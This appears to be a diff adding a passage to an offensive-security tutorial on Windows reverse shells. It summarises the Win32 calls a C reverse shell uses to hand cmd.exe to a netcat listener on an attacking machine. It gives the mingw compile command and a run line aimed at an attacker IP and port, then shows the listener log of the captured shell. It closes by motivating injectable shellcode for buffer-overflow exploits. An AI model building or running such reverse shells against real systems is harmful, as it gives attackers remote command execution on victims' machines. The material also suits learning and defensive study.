@@ -77,3 +77,38 @@ int main(int argc, char *argv[])
   }
 }
 ```
+
+From a high level the code does four things by using the Win32 APIs:
+
+- `WSAStartup` - Initialises the winsock DLL for use.
+- `WSASocket` - Creates a socket object which we can use to connect to a `netcat` listener on an attacking machine.
+- `WSAConnect` - Establishes a connection to our `netcat` listener.
+- `CreateProcess` - Creates a new `cmd.exe` process and redirects the stdin, stdout, and stderr streams to the winsock object.
+
+The C code can be compiled on a Linux machine using `mingw32`:
+
+```bash
+i686-w64-mingw32-g++ -std=c++11 shell.c -o shell.exe -s -lws2_32 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+```
+
+We can then run the portable executable on Windows:
+
+```powershell
+shell.exe 172.16.245.129 4444
+```
+
+This establishes a reverse shell back to the `netcat` listener:
+
+```bash
+nc -nvlp 4444 
+listening on [any] 4444 ...
+connect to [172.16.245.129] from (UNKNOWN) [172.16.245.128] 57270
+Microsoft Windows [Version 10.0.19044.1766]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\John\Desktop>
+```
+
+This is ok, but it has a few problems. It is compiled as a PE (portable executable) file, this means it needs to be dropped to disk and executed, which is not desirable. It cannot be used in a remote exploit, such as a buffer overflow. For this we need shellcode that can be injected into an existing process and does not rely upon the structure of a PE file to execute.
+
+When writing shellcode we need to carry out the same four tasks to establish a reverse shell, but we need to program it in assembly language, which presents us with a different set of problems.
